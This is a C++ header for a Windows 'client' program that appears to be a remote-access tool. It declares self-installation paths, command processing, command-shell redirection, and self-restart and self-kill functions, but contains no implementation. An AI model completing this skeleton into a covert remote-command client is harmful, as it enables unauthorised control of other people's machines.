#pragma once

#define GENERAL_H
#define WIN32_LEAN_AND_MEAN		//if left out order of windows.h and winsock.h plays messes up everything (just leave it in)
#define _WIN32_WINNT _WIN32_WINNT_WIN10

#include <Windows.h>		
#include <string>
#include <tchar.h>
#include <stdio.h>
#include <time.h>
#include <fstream>
#include <thread>
#include <process.h>
#include <wininet.h>
#pragma comment(lib,"Wininet.lib")

#include <Shared/utility.h>

#include "cmdRedirect.h"
#include "settings.h"
#include "conversion.h"
#include "client.h"

class General
{
public:		//some variables
	static std::string currentPath;			//current path of executable
	static std::string installFolder;		//path of folder it should be installed to
	static std::string installPath;			//full path where executable should be installed to
	static bool installing;			//bool - defines whether the file is currently being installed (and should be terminated after the initiation sequence,
									//instead of proceeding to the main loop)
	static LPTSTR lpArguments;
	static std::string currentDateTime();

public:		//functions
	static void startProcess(LPCTSTR lpApplicationName, LPTSTR lpArguments);		//starts a process
	static void handleError(int errType, bool errSevere);							//handles errors
	static std::string processCommand(std::string command);		//processes command
	static void restartSelf();		//restarts client
	static void killSelf();			//kills client
	static void log(std::string message);	//logs message / error / etc
	static bool IsInternetAvailable();

private:	//functions
	static bool processParameter(std::string &command, std::string compCommand);
};